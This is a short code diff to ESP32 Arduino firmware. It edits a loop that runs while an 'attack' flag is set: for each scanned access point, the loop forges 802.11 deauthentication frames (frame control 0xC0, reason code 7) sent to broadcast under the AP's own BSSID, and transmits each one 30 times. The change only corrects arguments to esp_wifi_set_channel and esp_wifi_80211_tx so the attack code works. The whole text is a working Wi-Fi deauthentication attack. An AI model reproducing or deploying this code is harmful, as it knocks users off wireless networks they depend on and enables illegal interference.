@@ -67,14 +67,14 @@ void loop() {
       if (!attack) break;
       int ch = WiFi.channel(i);
       if (ch < 1) ch = 1; if (ch > 13) ch = 13;
-      esp_wifi_set_channel(ch, 0);
+      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
       uint8_t b[6];
       sscanf(WiFi.BSSIDstr(i).c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &b[0],&b[1],&b[2],&b[3],&b[4],&b[5]);
       struct __attribute__((packed)) { uint8_t f[2],d[2],a1[6],a2[6],a3[6],s[2],r[2]; } p;
       memset(&p, 0, 24);
       memcpy(p.a1, (uint8_t[]){0xFF,0xFF,0xFF,0xFF,0xFF,0xFF}, 6);
       memcpy(p.a2, b, 6); memcpy(p.a3, b, 6);
-      for (int j = 0; j < 30; j++) { p.f[0] = 0xC0; p.r[0] = 7; esp_wifi_80211_tx(0, &p, 24, 0); }
+      for (int j = 0; j < 30; j++) { p.f[0] = 0xC0; p.r[0] = 7; esp_wifi_80211_tx(WIFI_IF_STA, &p, 24, false); }
       delay(2);
     }
     digitalWrite(led, 0);
